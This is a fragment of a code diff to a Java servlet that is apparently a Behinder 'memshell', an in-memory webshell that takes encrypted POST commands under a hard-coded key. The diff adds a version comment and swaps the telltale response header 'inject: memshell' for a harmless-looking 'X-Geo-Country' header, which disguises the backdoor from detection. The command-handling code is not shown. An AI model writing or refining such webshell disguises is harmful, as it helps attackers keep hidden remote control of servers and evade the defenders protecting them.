@@ -7,6 +7,7 @@ import java.io.IOException;
 import java.lang.reflect.Method;
 
 /**
+ * Behinder3 beta11
  * created by 0x22cb7139 on 2021/7/12
  */
 public class CustomServlet implements Servlet {
@@ -24,7 +25,7 @@ public class CustomServlet implements Servlet {
     public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
         HttpServletRequest req = (HttpServletRequest) servletRequest;
         HttpServletResponse rsp = (HttpServletResponse) servletResponse;
-        rsp.setHeader("inject","memshell");
+        rsp.setHeader("X-Geo-Country","*");
         try {
             if (req.getMethod().equals("POST")) {
                 String k = "f5d7aa3ba4929cc1";
